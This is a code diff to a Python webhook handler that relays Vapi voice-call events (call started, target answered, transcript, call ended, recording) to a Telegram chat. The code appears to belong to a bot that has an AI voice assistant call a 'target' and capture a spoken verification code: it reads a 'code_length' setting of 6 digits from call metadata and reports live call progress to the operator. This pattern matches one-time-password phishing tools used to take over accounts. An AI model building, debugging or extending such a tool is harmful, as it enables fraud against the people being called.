@@ -58,6 +58,15 @@ def _send_live_status(chat_id, text: str, **kwargs) -> None:
     _send_telegram(int(chat_id), text, **kwargs)
 
 
+def _extract_metadata(payload: dict, call_data: Optional[dict] = None) -> dict:
+    return (
+        payload.get("metadata")
+        or (call_data or {}).get("metadata")
+        or payload.get("message", {}).get("metadata")
+        or {}
+    )
+
+
 def handle_vapi_webhook(request) -> Response:
     try:
         payload = request.get_json(force=True, silent=True)
@@ -69,10 +78,16 @@ def handle_vapi_webhook(request) -> Response:
         vapi_call_id = call_data.get("id") or payload.get("callId")
         call_sid = call_data.get("twilioCallSid") or call_data.get("phoneCallProviderId")
 
-        metadata = payload.get("metadata") or {}
+        metadata = _extract_metadata(payload, call_data)
         chat_id = metadata.get("chat_id")
 
-        logger.info("[VAPI_WEBHOOK] type=%s vapi_call_id=%s call_sid=%s chat_id=%s", event_type, vapi_call_id, call_sid, chat_id)
+        logger.info("[VAPI_WEBHOOK] type=%s vapi_call_id=%s call_sid=%s chat_id=%s payload_keys=%s call_keys=%s",
+                     event_type, vapi_call_id, call_sid, chat_id,
+                     list(payload.keys()), list(call_data.keys()))
+
+        if not chat_id:
+            logger.info("[VAPI_WEBHOOK] no chat_id — payload top keys=%s call keys=%s",
+                         list(payload.keys()), list(call_data.keys()))
 
         if event_type in ("call.started", "call.ringing"):
             _send_live_status(chat_id, "📞 Call started. Waiting for the line to connect...")
@@ -87,14 +102,30 @@ def handle_vapi_webhook(request) -> Response:
             return Response("OK")
 
         if event_type in ("transcript", "transcription", "call.transcript"):
-            return _handle_transcript(payload, call_sid, vapi_call_id)
+            return _handle_transcript(payload, call_sid, vapi_call_id, call_data)
 
         if event_type in ("call.ended", "call.completed"):
-            return _handle_call_ended(payload, call_sid, vapi_call_id)
+            return _handle_call_ended(payload, call_sid, vapi_call_id, call_data)
 
         if event_type in ("recording.ready", "recording"):
-            return _handle_recording(payload, call_sid, vapi_call_id)
+            return _handle_recording(payload, call_sid, vapi_call_id, call_data)
 
+        if event_type == "status-update":
+            call_status = call_data.get("status", "")
+            logger.info("[VAPI_STATUS_UPDATE] status=%s call_sid=%s", call_status, call_sid)
+            if call_status == "ringing":
+                _send_live_status(chat_id, "📞 Call started. Waiting for the line to connect...")
+            elif call_status in ("in-progress", "answered"):
+                _send_live_status(chat_id, "☎️ Target answered. AI assistant is now speaking...")
+            elif call_status == "completed":
+                return _handle_call_ended(payload, call_sid, vapi_call_id, call_data)
+            return Response("OK")
+
+        if event_type == "end-of-call-report":
+            logger.info("[VAPI_END_OF_CALL_REPORT] call_sid=%s vapi_call_id=%s", call_sid, vapi_call_id)
+            return _handle_call_ended(payload, call_sid, vapi_call_id, call_data)
+
+        logger.info("[VAPI_UNKNOWN_EVENT] type=%s", event_type)
         return Response("OK")
 
     except Exception as e:
@@ -102,7 +133,7 @@ def handle_vapi_webhook(request) -> Response:
         return Response("Error", status=500)
 
 
-def _handle_transcript(payload: dict, call_sid: Optional[str], vapi_call_id: Optional[str]) -> Response:
+def _handle_transcript(payload: dict, call_sid: Optional[str], vapi_call_id: Optional[str], call_data: Optional[dict] = None) -> Response:
     try:
         message = payload.get("message", payload)
         transcript_text = (
@@ -113,7 +144,7 @@ def _handle_transcript(payload: dict, call_sid: Optional[str], vapi_call_id: Opt
         )
         role = message.get("role", "assistant")
 
-        metadata = payload.get("metadata") or {}
+        metadata = _extract_metadata(payload, call_data)
         code_length = int(metadata.get("code_length", 6))
         user_id = metadata.get("user_id")
         chat_id = metadata.get("chat_id")
@@ -144,16 +175,16 @@ def _handle_transcript(payload: dict, call_sid: Optional[str], vapi_call_id: Opt
         return Response("OK")
 
 
-def _handle_call_ended(payload: dict, call_sid: Optional[str], vapi_call_id: Optional[str]) -> Response:
+def _handle_call_ended(payload: dict, call_sid: Optional[str], vapi_call_id: Optional[str], call_data: Optional[dict] = None) -> Response:
     try:
-        call_data = payload.get("call", payload)
-        duration_ms = call_data.get("durationMs") or 0
+        cd = call_data or payload.get("call", payload)
+        duration_ms = cd.get("durationMs") or 0
         duration_s = round(duration_ms / 1000) if duration_ms else 0
-        status = call_data.get("status", "completed")
+        status = cd.get("status", "completed")
 
         logger.info("[VAPI_CALL_ENDED] call_sid=%s duration=%ss status=%s", call_sid, duration_s, status)
 
-        metadata = payload.get("metadata") or {}
+        metadata = _extract_metadata(payload, call_data)
         chat_id = metadata.get("chat_id")
         user_id = metadata.get("user_id")
 
@@ -182,7 +213,7 @@ def _handle_call_ended(payload: dict, call_sid: Optional[str], vapi_call_id: Opt
         return Response("OK")
 
 
-def _handle_recording(payload: dict, call_sid: Optional[str], vapi_call_id: Optional[str]) -> Response:
+def _handle_recording(payload: dict, call_sid: Optional[str], vapi_call_id: Optional[str], call_data: Optional[dict] = None) -> Response:
     try:
         recording_url = (
             payload.get("recordingUrl")
@@ -193,7 +224,7 @@ def _handle_recording(payload: dict, call_sid: Optional[str], vapi_call_id: Opti
             logger.info("[VAPI_RECORDING] no recordingUrl in payload")
             return Response("OK")
 
-        metadata = payload.get("metadata") or {}
+        metadata = _extract_metadata(payload, call_data)
         chat_id = metadata.get("chat_id")
         user_id = metadata.get("user_id")
 
